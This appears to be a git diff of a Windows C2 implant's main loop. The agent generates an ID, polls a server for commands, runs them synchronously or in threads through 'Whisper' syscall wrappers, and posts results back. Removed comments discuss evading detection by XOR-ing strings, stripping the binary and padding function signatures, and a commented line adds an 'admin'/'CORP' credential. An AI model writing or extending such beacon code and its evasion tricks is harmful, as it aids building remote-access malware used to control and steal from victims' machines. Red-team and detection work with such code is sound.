@@ -11,21 +11,10 @@
 #include <stdint.h>
 #include <stdio.h>
 #include <windows.h> // < might be hodling some defs that we need to dynamically call... deal with later
-// #include <unistd.h>  // For sleep(), use windows.h for sleep, or a custom one
-/*
-RE Notes:
- - Going to need to XOR strings
- - Strip Binary as well
- - Note, the Whisper functions might match signatures of known windows funcs -
-so that could be a detection. maybe add a BS argument to each one to bypass
-this? either at front or back.
 
-*/
-
-// int execute();
-DWORD execute(LPVOID exec_args);
+DWORD execute(HeapStore *heapStorePointer);
 void generate_uuid4(char *agent_id);
-void execution_setup(char *agent_id, HeapStore *heapStorePointer);
+void execution_setup(HeapStore *heapStorePointer);
 
 // ASYNC BEACON!!!
 /*
@@ -57,7 +46,7 @@ int main()
     HeapStore *heapStorePointer = malloc(sizeof(HeapStore));
     if (heapStorePointer == NULL)
     {
-        fprintf(stderr, "Memory allocation failed for HeapStore\n");
+        DEBUG_LOGF(stderr, "Memory allocation failed for HeapStore\n");
         return 1;
     }
     // Initialize the subsystems; if it fails, free memory and exit
@@ -69,16 +58,16 @@ int main()
 
     generate_uuid4(heapStorePointer->agentStore->agent_id);
 
-    // move to heapstruct
-    char agent_id[37];
-    generate_uuid4(agent_id);
+    // // move to heapstruct
+    // char agent_id[37];
+    // generate_uuid4(agent_id);
 
     // Example of setting the execution mode (you can do this at any point in your code)
     set_execution_mode(EXEC_MODE_SYNC, heapStorePointer); // Initially run synchronously
 
     while (1)
     {
-        execution_setup(agent_id, heapStorePointer); // Call the command execution function
+        execution_setup(heapStorePointer); // Call the command execution function
         DEBUG_LOG("EXECUTION SUCCESS");
 
         // WhisperSleep(get_sleep_time());
@@ -90,18 +79,18 @@ int main()
 }
 
 // Function to execute the command (switching logic)
-void execution_setup(char *agent_id, HeapStore *heapStorePointer)
+void execution_setup(HeapStore *heapStorePointer)
 {
     // ... command checking logic (when you implement it) ...
 
     // Setup exec args for the thread run
     // WhisperCreateThread only takes one arg arg, so this is how to pass multiple
-    EXEC_ARGS *exec_args = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(EXEC_ARGS));
-    if (!exec_args)
-        return; // handle allocation error
+    // EXEC_ARGS *exec_args = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(EXEC_ARGS));
+    // if (!exec_args)
+    //     return; // handle allocation error
 
-    exec_args->agent_id = agent_id;
-    exec_args->heapStorePointer = heapStorePointer;
+    // exec_args->agent_id = agent_id;
+    // exec_args->heapStorePointer = heapStorePointer;
 
     switch (get_execution_mode(heapStorePointer))
     {
@@ -111,7 +100,7 @@ void execution_setup(char *agent_id, HeapStore *heapStorePointer)
 
         // Asynchronous execution (new thread)
         // need to move agent_id into struct with config to fix the mutliple args
-        HANDLE thread = WhisperCreateThread(NULL, 0, execute, exec_args, 0, NULL);
+        HANDLE thread = WhisperCreateThread(NULL, 0, execute, heapStorePointer, 0, NULL);
         if (thread)
         {
             CloseHandle(thread); // Detach the thread
@@ -119,28 +108,30 @@ void execution_setup(char *agent_id, HeapStore *heapStorePointer)
         else
         {
             DEBUG_LOG("Failed to create thread.\n");
-            HeapFree(GetProcessHeap(), 0, exec_args); // Clean up afterward if fails
+            // HeapFree(GetProcessHeap(), 0, exec_args); // Clean up afterward if fails
         }
         break;
     }
     case EXEC_MODE_SYNC:
     {
         DEBUG_LOG("SYNC/INLINE\n");
-        execute(exec_args);                       // Call the function directly
-        HeapFree(GetProcessHeap(), 0, exec_args); // Clean up afterward if fails
+        execute(heapStorePointer); // Call the function directly
+        // HeapFree(GetProcessHeap(), 0, exec_args); // Clean up afterward if fails
         break;
     }
     default:
         DEBUG_LOG("Invalid execution mode.\n");
         // free heap allocated memory
-        HeapFree(GetProcessHeap(), 0, exec_args);
+        // HeapFree(GetProcessHeap(), 0, exec_args);
         break;
     }
 }
 
 // Thread function for executing the command
-DWORD WINAPI execute(LPVOID exec_args)
+DWORD WINAPI execute(HeapStore *heapStorePointer)
 {
+
+    // agentid = heapStorePointer->agentStore->agent_id
 
     // bug somewhere in here. yay
     //  add_credential("admin", "CORP",
@@ -152,15 +143,15 @@ DWORD WINAPI execute(LPVOID exec_args)
 
     // get data out of exec args that is needed for execution
     // rename to thread args otherwise it clashes with func arg
-    EXEC_ARGS *thread_args = (EXEC_ARGS *)exec_args;
+    // EXEC_ARGS *thread_args = (EXEC_ARGS *)exec_args;
 
-    char *agent_id = thread_args->agent_id;
-    HeapStore *heapStorePointer = thread_args->heapStorePointer;
+    // char *agent_id = thread_args->agent_id;
+    // HeapStore *heapStorePointer = thread_args->heapStorePointer;
 
     // this fills in the command, arg and command_id
-    InboundJsonDataStruct InboundJsonData = get_command_data(agent_id);
+    InboundJsonDataStruct InboundJsonData = get_command_data(heapStorePointer->agentStore->agent_id);
     // this populates the new structure with the agent_uuid
-    InboundJsonData.agent_id = agent_id;
+    InboundJsonData.agent_id = heapStorePointer->agentStore->agent_id;
 
     if (!InboundJsonData.command)
     {
@@ -186,7 +177,7 @@ DWORD WINAPI execute(LPVOID exec_args)
     }
 
     // Assign UUID
-    OutboundJsonData->agent_id = strdup(agent_id); // Allocates memory and copies the string. Previous strncpy_s only copied, not allocated. Need to free
+    OutboundJsonData->agent_id = strdup(heapStorePointer->agentStore->agent_id); // Allocates memory and copies the string. Previous strncpy_s only copied, not allocated. Need to free
     OutboundJsonData->command_result_data = NULL;
 
     // Parse command and modify OutboundJsonData
@@ -198,7 +189,7 @@ DWORD WINAPI execute(LPVOID exec_args)
 
     // Convert to JSON and send
     char *encoded_json_response = encode_json(OutboundJsonData->agent_id, OutboundJsonData->command_result_data, InboundJsonData.command_id);
-    post_data(encoded_json_response, agent_id);
+    post_data(encoded_json_response, heapStorePointer->agentStore->agent_id);
 
     // free allocated memory
     // need to double check this
